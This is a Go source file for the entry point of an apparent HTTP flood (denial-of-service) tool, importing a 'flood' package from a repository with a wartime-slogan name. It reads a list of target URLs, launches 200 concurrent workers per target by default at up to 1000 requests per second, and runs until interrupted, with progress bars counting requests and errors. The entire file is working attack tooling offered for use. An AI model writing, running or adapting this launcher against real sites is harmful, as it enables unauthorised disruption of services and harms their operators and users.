package main

import (
	"context"
	"flag"
	"fmt"
	"github.com/RusskijKorablIdiNaxuj/RusskijKorablIdiNaxuj/src/flood"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/vbauerster/mpb/v7"
	"github.com/vbauerster/mpb/v7/decor"
)

func main() {
	input := flag.String("i", "targets.txt", "A filename with a list of target HTTP/HTTPS addresses separated by newline; or an url.")
	N := flag.Int("N", 200, "Number of workers per target")
	maxRPS := flag.Int("t", 1000, "Target number of requests Per Second")
	silent := flag.Bool("s", false, "Do not print out progress bars")

	flag.Parse()

	var progress *mpb.Progress

	if !*silent {
		progress = mpb.New(mpb.WithWidth(64))
	}

	text := ""
	if strings.HasSuffix(*input, ".txt") {
		txt, err := os.ReadFile(*input)
		if err != nil {
			panic(err)
		}
		text = string(txt)
	} else {
		text = *input
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	for _, line := range strings.Split(string(text), "\n") {
		target := flood.New(line)

		var bar *mpb.Bar
		if !*silent {
			bar = progress.AddBar(-1,
				mpb.PrependDecorators(
					decor.Name(target.Name(), decor.WCSyncSpaceR),
					decor.Percentage(decor.WCSyncSpace),
				),
				mpb.AppendDecorators(
					decor.CountersNoUnit("%d / %d", decor.WCSyncWidth),
				),
			)
		}

		go func(t flood.Target, b *mpb.Bar) {
			t.Run(ctx, *N, *maxRPS, func(requests, errors int64) {
				if !*silent {
					b.SetTotal(int64(requests), false)
					b.SetCurrent(int64(errors))
				}
			})
		}(target, bar)
	}

	fmt.Println("Ctrl+C to stop")
	qch := make(chan os.Signal, 1)
	signal.Notify(qch, syscall.SIGINT, syscall.SIGTERM)
	<-qch
}
